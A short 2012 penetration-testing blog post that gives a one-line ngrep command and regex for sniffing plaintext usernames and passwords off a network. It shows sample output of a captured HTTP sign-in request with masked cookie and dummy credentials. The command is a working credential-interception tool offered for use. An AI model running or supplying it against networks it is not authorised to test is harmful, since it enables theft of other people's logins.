---
title: Quick and dirty ngrep credential (username/password) sniffer
author: Jan Seidl
type: post
date: 2012-10-31T02:59:25+00:00
url: /posts/quick-and-dirty-ngrep-credential-usernamepassword-sniffer/
categories:
  - Penetration Testing
tags:
  - credential sniffing
  - ngrep
  - regular expression
  - sniffing

---
Some time ago <a href="/posts/quick-and-dirty-tcpdump-credential-usernamepassword-sniffer/" title="QUICK AND DIRTY TCPDUMP CREDENTIAL (USERNAME/PASSWORD) SNIFFER" target="_blank">I&#8217;ve posted</a> a quick (and dirty too!) command-liner using `tcpdump` to sniff plaintext credentials over the wire.

Now I&#8217;ve acomplished the same thing with a shorter regex and `ngrep` tool.

{{< highlight bash >}}
ngrep '[&\s?](?:login|user(?:name|)|p(ass(?:word|wd|)|w|wd))[\s:=]\s?([^&\s]*)'  -q -i{{< /highlight >}}

_Where `-i` is for case-insensitive and `-q` for more precise output. See `man ngrep` for additional information._

And the output is as follows:

{{< highlight bash >}}
interface: eth0 (10.1.1.0/255.255.255.0)
match: [&\s?](?:login|user(?:name|)|p(ass(?:word|wd|)|w|wd))[\s:=]\s?([^&\s]*)

T 10.1.1.111:49196 -> 96.126.98.110:80 [AP]
  POST /users/signin <acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1..Host: www.commandlinefu.com..Connection: ke
  ep-alive..Content-Length: 43..Cache-Control: max-age=0..Origin: http://w
  ww.commandlinefu.com..User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleW
  ebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chro
  me/20.0.1132.47 Safari/536.11..Content-Type: application/x-www-form-urle
  ncoded..Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/
  *;q=0.8..Referer: http://www.commandlinefu.com/users/signin..Accept-Enco
  ding: gzip,deflate,sdch..Accept-Language: en-US,en;q=0.8,pt-BR;q=0.6,pt;
  q=0.4..Accept-Charset: <acronym title="International Organization for Standardization">ISO</acronym>-8859-1,utf-8;q=0.7,*;q=0.3..Cookie: XXXXXXXXX
  XXXXXXXXXXXX....username=aaaa&password=bbbbb&submit=Let+me+in%21                                        
{{< /highlight >}}

Hope that helps!
